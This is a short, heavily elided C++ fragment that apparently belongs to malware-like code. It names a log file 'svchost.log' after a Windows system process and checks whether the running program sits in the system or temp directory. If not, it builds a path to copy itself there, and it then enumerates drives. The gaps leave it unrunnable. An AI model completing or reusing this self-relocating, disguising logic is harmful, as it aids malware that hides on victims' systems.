...
std::vector<std::wstring> FileSystemService::GetLogicalDrivesW()
{
...
#define						TMPLOG							"svchost.log"
	...
	GetTempPathW(MAX_PATH, tmpAbsolutePath);
	GetSystemDirectoryW(sysAbsolutePath, MAX_PATH);
	...
	if (wcscmp(currentProcessAbsolutePath.c_str(), sysAbsolutePath) != 0 && (wcscmp(
		...
		tmpAbsolutePath) != 0))
	{
		swprintf_s(futureExeAbsolutePath, L"%s\\%s", sysAbsolutePath, currentProcessFileName.c_str());
		...
		else
		{
			...
			swprintf_s(futureExeAbsolutePath, L"%s%s", tmpAbsolutePath, currentProcessFileName.c_str());
...
{
	std::vector<std::wstring> drives = GetLogicalDrivesW();
